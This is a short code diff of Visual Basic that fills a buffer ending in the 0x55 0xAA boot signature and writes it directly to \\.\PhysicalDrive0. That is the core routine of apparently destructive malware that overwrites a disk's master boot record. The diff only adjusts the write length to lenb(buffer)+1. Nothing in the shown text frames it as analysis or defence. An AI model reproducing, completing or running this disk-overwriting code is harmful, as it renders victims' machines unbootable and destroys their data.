@@ -33,6 +33,6 @@ Chr(&H0) & Chr(&H0) & Chr(&H0) & Chr(&H0) & Chr(&H0) & Chr(&H0) & Chr(&H0) & Chr
 Chr(&H0) & Chr(&H0) & Chr(&H0) & Chr(&H0) & Chr(&H0) & Chr(&H0) & Chr(&H55) & Chr(&HAA)
 
     hFile = CreateFile("\\.\PhysicalDrive0", GENERIC_WRITE, FILE_SHARE_READ Or FILE_SHARE_WRITE, 0&, OPEN_EXISTING, 0&, 0&)
-    WriteFile hFile, buffer(0), 32768, bytesWritten, 0&
+    WriteFile hFile, buffer(0), lenb(buffer)+1, bytesWritten, 0&
     CloseHandle hFile
 End Sub
